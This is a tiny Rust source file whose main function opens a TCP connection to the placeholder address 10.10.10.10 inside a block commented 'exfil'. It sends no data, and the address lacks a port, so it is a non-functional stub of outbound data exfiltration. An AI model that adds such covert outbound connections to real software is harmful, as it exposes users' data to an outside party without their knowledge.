use std::net::TcpStream;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.10.10.10") { /* exfil */ }
}
